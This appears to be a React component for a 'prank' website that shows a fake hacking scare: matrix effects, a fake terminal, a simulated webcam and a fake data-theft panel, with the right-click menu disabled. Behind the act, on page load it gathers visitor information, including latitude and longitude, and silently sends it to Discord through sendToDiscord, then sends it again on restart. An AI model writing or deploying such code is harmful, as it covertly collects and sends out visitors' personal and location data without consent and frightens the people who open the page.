'use client'

import { useState, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Loader2 } from 'lucide-react'
import { getUserInfo } from '@/lib/getUserInfo'
import { sendToDiscord } from '@/app/actions/discord'
import MatrixBackground from './MatrixBackground'
import WarningOverlay from './WarningOverlay'
import HackerTerminal from './HackerTerminal'
import PrankMessage from './PrankMessage'
import Footer from './Footer'
import LocationMap from './LocationMap'
import SystemInfo from './SystemInfo'
import DataExfiltration from './DataExfiltration'
import NetworkActivity from './NetworkActivity'
import WebcamSimulation from './WebcamSimulation'

export default function SystemBreach() {
  const [stage, setStage] = useState(0)
  const [userInfo, setUserInfo] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    const fetchUserInfo = async () => {
      try {
        const info = await getUserInfo()
        setUserInfo(info)
        const discordResult = await sendToDiscord(info)
        if (!discordResult.success) {
          console.error('Failed to send to Discord:', discordResult.error)
        }
      } catch (err) {
        console.error('Error:', err)
        setError('CRITICAL SYSTEM FAILURE: SECURITY PROTOCOLS COMPROMISED')
      } finally {
        setLoading(false)
      }
    }

    fetchUserInfo()

    const stageTimers = [
      setTimeout(() => setStage(1), 2000),
      setTimeout(() => setStage(2), 5000),
      setTimeout(() => setStage(3), 8000),
      setTimeout(() => setStage(4), 12000),
      setTimeout(() => setStage(5), 16000),
      setTimeout(() => setStage(6), 20000),
      setTimeout(() => setStage(7), 25000)
    ]

    return () => stageTimers.forEach(clearTimeout)
  }, [])

  useEffect(() => {
    const preventContextMenu = (e: Event) => e.preventDefault()
    window.addEventListener('contextmenu', preventContextMenu)
    return () => window.removeEventListener('contextmenu', preventContextMenu)
  }, [])

  if (loading) {
    return (
      <div className="min-h-screen w-screen bg-black flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-red-500 animate-spin" />
      </div>
    )
  }

  if (error) {
    return (
      <div className="min-h-screen w-screen bg-black flex items-center justify-center text-red-500 p-4 text-center">
        <div>
          <h1 className="text-xl sm:text-2xl font-bold mb-4">{error}</h1>
          <p className="text-base sm:text-lg">SYSTEM LOCKDOWN INITIATED</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen w-screen overflow-hidden bg-black text-red-500 font-mono relative">
      <MatrixBackground />
      <div className="relative z-10 p-4 flex flex-col min-h-screen">
        <WarningOverlay stage={stage} userInfo={userInfo} hackerName="Nikhil" />
        
        <div className="flex-grow grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mt-4">
          <AnimatePresence>
            {stage >= 3 && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
              >
                <SystemInfo userInfo={userInfo} />
              </motion.div>
            )}
          </AnimatePresence>
          
          <AnimatePresence>
            {stage >= 5 && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
              >
                <DataExfiltration />
              </motion.div>
            )}
          </AnimatePresence>
          
          <AnimatePresence>
            {stage >= 5 && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
              >
                <NetworkActivity />
              </motion.div>
            )}
          </AnimatePresence>
        </div>
        
        <AnimatePresence>
          {stage >= 4 && stage < 7 && userInfo && userInfo.latitude && userInfo.longitude && (
            <motion.div
              className="mt-4"
              initial={{ opacity: 0, y: 100 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 100 }}
            >
              <LocationMap 
                latitude={parseFloat(userInfo.latitude)} 
                longitude={parseFloat(userInfo.longitude)} 
              />
            </motion.div>
          )}
        </AnimatePresence>
        
        <AnimatePresence>
          {stage >= 6 && stage < 7 && (
            <motion.div
              className="mt-4"
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.8 }}
            >
              <WebcamSimulation />
            </motion.div>
          )}
        </AnimatePresence>
        
        <AnimatePresence>
          {stage >= 1 && stage < 7 && (
            <motion.div
              className="mt-4"
              initial={{ opacity: 0, y: 100 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 100 }}
            >
              <HackerTerminal 
                userInfo={userInfo} 
                stage={stage} 
                hackerName="Nikhil"
              />
            </motion.div>
          )}
        </AnimatePresence>
        
        <AnimatePresence>
          {stage === 7 && (
            <PrankMessage 
              hackerName="Nikhil" 
              onRestart={() => {
                setStage(0)
                if (userInfo) {
                  sendToDiscord({
                    ...userInfo,
                    timestamp: new Date().toISOString(),
                    hackerName: "Nikhil"
                  })
                }
              }} 
            />
          )}
        </AnimatePresence>
      </div>
      <Footer hackerName="Nikhil" />
    </div>
  )
}

